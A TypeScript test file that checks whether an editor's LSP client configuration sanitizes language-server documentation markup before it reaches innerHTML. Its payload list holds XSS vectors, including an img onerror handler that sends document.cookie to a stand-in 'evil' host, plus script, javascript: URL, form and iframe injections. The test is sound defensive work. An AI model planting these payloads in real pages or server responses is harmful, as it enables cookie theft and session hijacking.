/**
 * The markup a language server returns, rendered through the client the app actually configures.
 *
 * `@codemirror/lsp-client` assigns its rendered documentation to `innerHTML` in two places the
 * core's sink gate cannot see because they live in a dependency: `renderDocInfo` (the completion
 * info panel) and the signature-help docs element. The package offers exactly one control —
 * `sanitizeHTML` on the client config — and it is optional, which is the whole hazard: an omitted
 * config field is invisible, and the visible hover path has always sanitized through
 * `lsp-hover-actions`, so nothing looked wrong.
 *
 * Written the way `sanitize.unit.ts` is: a payload list plus a control case per refusal, so a pass
 * here means it is this configuration refusing and not the renderer happening to escape.
 */
import { describe, it, expect, afterEach } from 'vitest';
import { EditorState } from '@codemirror/state';
import { EditorView } from '@codemirror/view';
import { LSPClient, LSPPlugin } from '@codemirror/lsp-client';
import { lspClientConfig } from '$lib/utils/lsp-client-config';

const views: EditorView[] = [];

/** The client `FileEditor` builds, from the production config factory. */
function pluginFor(filePath: string): LSPPlugin {
  const client = new LSPClient(
    lspClientConfig({
      extensions: [],
      rootUri: 'file:///repo',
      getFile: () => filePath,
      onMessage: () => {},
    }),
  );
  const view = new EditorView({
    state: EditorState.create({ doc: 'package main\n', extensions: [client.plugin(`file://${filePath}`, 'go')] }),
  });
  views.push(view);
  const plugin = LSPPlugin.get(view);
  if (!plugin) throw new Error('no LSPPlugin on the view — the fixture is not wired like the app');
  return plugin;
}

/**
 * One documentation item as a server sends it, through the call whose result the package puts in
 * `innerHTML`. MarkupContent with kind `markdown` is the shape that carries markup: a bare string
 * is plaintext and the renderer escapes it, which is why this test must send the object form.
 */
function asRenderedDoc(plugin: LSPPlugin, markdown: string): HTMLElement {
  const html = plugin.docToHTML({ kind: 'markdown', value: markdown });
  const elt = document.createElement('div'); // what renderDocInfo does
  elt.innerHTML = html;
  return elt;
}

afterEach(() => {
  while (views.length) views.pop()?.destroy();
});

describe('a language server cannot write markup into the page', () => {
  const payloads: Array<[string, string, (elt: HTMLElement) => unknown]> = [
    ['an event handler', '<img src=x onerror="fetch(\'https://evil/?c=\'+document.cookie)">', (e) => e.querySelector('[onerror]')],
    ['a script element', '<script>alert(1)</script>', (e) => e.querySelector('script')],
    ['a javascript: URL', '<a href="javascript:alert(1)">go</a>', (e) => e.querySelector('a[href^="javascript"]')],
    ['a style attribute', '<p style="position:fixed;inset:0;background:#111">continue</p>', (e) => e.querySelector('[style]')],
    ['a style element', '<div><style>#app{display:none}</style></div>', (e) => e.querySelector('style')],
    ['a form', '<form action="https://evil.example"><input name=t><button>Go</button></form>', (e) => e.querySelector('form')],
    ['an iframe', '<iframe src="https://evil.example"></iframe>', (e) => e.querySelector('iframe')],
  ];

  for (const [name, payload, find] of payloads) {
    it(`refuses ${name}`, () => {
      const plugin = pluginFor('/repo/main.go');
      const elt = asRenderedDoc(plugin, payload);
      expect(find(elt), `kept by the renderer: ${elt.innerHTML}`).toBeNull();
    });
  }

  it('still renders the signature it was asked to render', () => {
    // The control: a refusal that also ate every legitimate document would be the
    // green that hides a broken editor.
    const plugin = pluginFor('/repo/main.go');
    const elt = asRenderedDoc(
      plugin,
      '```go\nfunc Println(a ...any) (n int, err error)\n```\n\nPrintln formats using the default formats.',
    );
    expect(elt.textContent).toContain('Println');
    expect(elt.querySelector('pre, code, span')).not.toBeNull();
  });

  it('is the config that refuses, not the absence of a markdown path', () => {
    // The bug, kept executable: the same payload through the same renderer with the hook omitted
    // — how it shipped — must survive as markup. If this ever passes, the package sanitized
    // internally and the config field is doing nothing worth a comment.
    const client = new LSPClient({ extensions: [], rootUri: 'file:///repo' });
    const view = new EditorView({
      state: EditorState.create({ doc: 'package main\n', extensions: [client.plugin('file:///repo/main.go', 'go')] }),
    });
    views.push(view);
    const plugin = LSPPlugin.get(view)!;
    const elt = asRenderedDoc(plugin, '<div><style>#app{display:none}</style></div>');
    expect(elt.querySelector('style')).not.toBeNull();
  });
});
